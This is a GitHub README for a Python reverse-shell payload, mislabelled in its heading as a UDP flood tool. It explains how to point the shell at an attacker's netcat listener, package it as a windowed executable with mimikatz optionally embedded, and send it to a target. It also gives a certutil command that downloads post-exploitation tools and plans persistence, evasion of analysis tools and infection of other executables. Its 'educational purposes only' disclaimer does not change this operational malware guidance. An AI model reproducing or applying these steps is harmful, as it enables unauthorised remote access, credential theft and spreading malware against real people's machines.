<h1 align="center">Powerful UDP Flood attack tool written in Python 3</h1>

<p align="center">
<a href="#"><img alt="reverseshellpy forks" src="https://img.shields.io/github/forks/cdkw/reverseshellpy?style=for-the-badge"></a>
<a href="#"><img alt="reverseshellpy last commit (main)" src="https://img.shields.io/github/last-commit/cdkw/reverseshellpy/main?color=green&style=for-the-badge"></a>
<a href="#"><img alt="reverseshellpy Repo stars" src="https://img.shields.io/github/stars/cdkw/reverseshellpy?style=for-the-badge&color=yellow"></a>
<a href="#"><img alt="reverseshellpy License" src="https://img.shields.io/github/license/cdkw/reverseshellpy?color=orange&style=for-the-badge"></a>
<a href="https://github.com/cdkw/reverseshellpy/issues"><img alt="reverseshellpy issues" src="https://img.shields.io/github/issues/cdkw/reverseshellpy?color=purple&style=for-the-badge"></a>

<p align="center">Do not attack anyone without their consent.</p>
<p align="center"><img src="https://i.imgur.com/UdclI8E.png" alt="SCRIPT"></p>


# Reverse Shell Using Python
Reverse shell payload only using python
= EDUCATIONAL PURPOSES ONLY =

# Usage:

Replace in the python file the ip and port of your netcat reverse shell server.
```py
def main():
    server_ip = '127.0.0.1'  # Replace with the server's IP address
    server_port = 9001       # Replace with the same port number used on the server
```


Then using auto_py_to_exe or py_to_exe make it an executable. Note that this did not work on kali linux for me.
```
pip install auto-py-to-exe
python -m auto_py_to_exe
```

Select the `Script Location`, then choose `One file`, then choose `window based`. Add an icon if you want, or extra files like mimikatz.exe embedded into it (requires your own code). Then `Convert .py to .exe`. Open the folder you were in when u typed `python -m auto_py_to_exe` and go into `output`, in this folder you will find your exe file.

Now, just send it to your other machine. 
`Note that this is not obfuscated or made to be used with any tunnel to hide the server's ip.`


# Post-exploitation:

After gaining access to your target, you can use `certutil` (`certutil -urlcache -split -f https://www.example.com/example.zip C:\path\to\file`, it being located in the system32 folder) or the embedded `--wget` function of the rs.py to download post-exploitation tools like priviledge exploitation with `mimikatz.exe`.

# Future plans:
- Once ran, automatically add to boot menu
- Every 1 minute try to connect to server machine, if not connected
- If process explorer, wireshark or other are detected, it enters in a hibernation stage for 1 hour, then it tries the connecting again
- If ran with administrator perms, it will infect other .exe files
